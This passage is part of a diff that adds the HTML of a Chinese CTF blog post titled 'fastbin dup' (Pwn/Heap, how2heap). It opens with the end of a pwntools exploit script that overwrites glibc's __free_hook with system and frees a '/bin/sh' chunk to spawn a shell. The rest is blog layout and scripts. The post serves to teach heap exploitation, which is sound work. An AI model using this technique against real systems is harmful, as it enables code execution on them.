class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system_addr=libcbase+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x20</span>,p64(free_hook))<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<br>add(<span class="hljs-number">10</span>,<span class="hljs-number">0x20</span>,p64(system_addr))<br>add(<span class="hljs-number">11</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>delete(<span class="hljs-number">11</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF/Pwn/" class="category-chain-item">Pwn</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF/Pwn/Heap/" class="category-chain-item">Heap</a>
+  
+  
+
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/how2heap/" class="print-no-link">#how2heap</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>fastbin dup</div>
+      <div>http://akaieurus.github.io/2023/01/23/fastbin-dup/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Eurus</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年1月23日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/01/25/safe-linking/" title="safe-linking">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">safe-linking</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/01/22/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B01/" title="2.24-2.35堆相关源码阅读笔记">
+                        <span class="hidden-mobile">2.24-2.35堆相关源码阅读笔记</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
